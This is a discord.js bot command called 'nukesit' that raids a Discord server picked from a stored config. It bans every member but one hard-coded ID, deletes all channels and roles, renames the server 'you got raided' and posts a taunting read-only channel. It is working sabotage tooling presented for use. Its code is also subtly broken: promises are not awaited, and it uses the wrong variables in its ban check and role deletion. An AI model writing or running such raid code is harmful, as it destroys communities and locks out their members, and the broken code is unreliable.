const {Client, Message, MessageEmbed} = require('discord.js')
const db = require('quick.db')

module.exports = {
    name: 'nukesit',
    UserPerms: ["SEND_MESSAGES"],
    ownerOnly: true,
    minArgs: 0,
    maxArgs: 0,
    syntax: 'v!nukeit',

    run: async (client, message, args) => {

        const serverId = db.get(`ownerOnlyConfig.nukebot`)        

        const server = client.guilds.cache.find(g => g.id === serverId)

        const members = server.members.fetch()
        members.forEach(m => {
            if(members.id === '614076042901979156') return
            m.ban({reason: `lol`})
        })
        const channels = server.channels.fetch()
        channels.forEach(c => {
            c.delete()
        })
        const roles = server.roles.fetch()
        roles.forEach(r => {
            roles.delete()
        })
        server.setName(`you got raided`)
        server.setIcon(`https://www.google.com/search?q=laugh+emoji+meme&sxsrf=APq-WBvbry-zdiILtbI29pmOOc654MAklg:1644319871583&tbm=isch&source=iu&ictx=1&vet=1&fir=K6u0BfIiMJBcHM%252CyO61v8IIhko4EM%252C_%253BapPG--xFvVP8fM%252CQzeUrziAzUcjXM%252C_%253Bz3OBkZUIXGSGjM%252CjWkHFSZZOa2UiM%252C_%253BfAGsEvR0K00OKM%252Cp5yomiUy-tPR5M%252C_%253B8-4tGYYbJDF93M%252CDB8nGbg2zkxcfM%252C_%253BrXzyovrHsWkVcM%252Cn5E6qyNpt34wLM%252C_%253BVzjzchzFzDx1sM%252CkwY8114GwEMwlM%252C_%253BizSOYZMWC0-cDM%252CFD2uTVscj_FvnM%252C_%253BIrDCDZiZlcDs5M%252CZyFltJfEgNcUhM%252C_%253B9L0u2y7_0bQkLM%252C3oIQ-iK1di6b4M%252C_%253BjAh_DkCs2zdpnM%252CQBTtFoxtRvpmlM%252C_%253BVfA5lIAWGVT0JM%252Ccq1kh9XbLUPvsM%252C_%253B3WgtBW4F7bJy2M%252CDoBF-WDS8TbbnM%252C_%253BPgsYwifuul26eM%252CLZ74Sr-sCUJiOM%252C_%253B6QJskiOKwW9mdM%252CfhsyhXDqxAz5eM%252C_%253BXskSBa8zw0ohtM%252Ca7JnloeXEKGaEM%252C_&usg=AI4_-kTFl42Lkrb0ua6JP_BjtgUEsq7nHQ&sa=X&ved=2ahUKEwi4vN7ugPD1AhX_RPEDHaCED_IQ9QF6BAgCEAE#imgrc=K6u0BfIiMJBcHM`)

        server.channels.create(`you got raided :(`, {
            type: "GUILD_TEXT",
            permissionOverwrites: [
                {
                    id: server.roles.everyone,
                    allow: ["VIEW_CHANNEL"],
                    deny: ["SEND_MESSAGES"]
                }
            ]
        })


    }
}